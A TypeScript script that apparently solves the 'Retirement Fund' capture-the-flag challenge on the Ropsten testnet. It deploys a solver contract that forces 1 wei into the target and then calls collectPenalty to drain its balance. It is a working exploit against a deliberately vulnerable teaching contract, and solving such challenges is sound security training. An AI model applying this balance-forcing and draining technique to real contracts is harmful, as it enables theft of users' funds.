import { Contract, ContractFactory } from "@ethersproject/contracts";
import { formatEther } from "@ethersproject/units";

import { artifacts } from "../artifacts";
import { provider, wallets } from "../constants";
import { deployments } from "../deployments";
import { log } from "../utils";

export const retirementFund = async (signer = wallets[0]): Promise<void> => {

  const userAddress = await signer.getAddress();
  log(`User address = ${userAddress}`);
  log(`User balance = ${formatEther(await provider.getBalance(userAddress))}`);

  const challenge = new Contract(
    deployments.ropsten.RetirementFundChallenge.address,
    deployments.ropsten.RetirementFundChallenge.abi,
    provider,
  );

  log(`Preparing to solve challenge at ${challenge.address}`);
  log(`Challenge balance = ${await provider.getBalance(challenge.address)}`);
  log(`Challenge complete = ${await challenge.isComplete()}`);

  const factory = new ContractFactory(
    artifacts.RetirementFundSolver.abi,
    artifacts.RetirementFundSolver.bytecode,
    signer,
  );

  const solver = await factory.deploy(challenge.address, { value: "1" });
  await solver.deployTransaction.wait();

  log(`Solver has been deployed to ${solver.address}`);
  log(`Challenge balance = ${await provider.getBalance(challenge.address)}`);

  const collectionTx = await challenge.connect(signer).collectPenalty();
  log(`Sent collection tx: ${collectionTx.hash}`);
  await collectionTx.wait();
  log(`Mined collection tx`);

  log(`Challenge balance = ${await provider.getBalance(challenge.address)}`);
  log(`Challenge complete = ${await challenge.isComplete()}`);

};

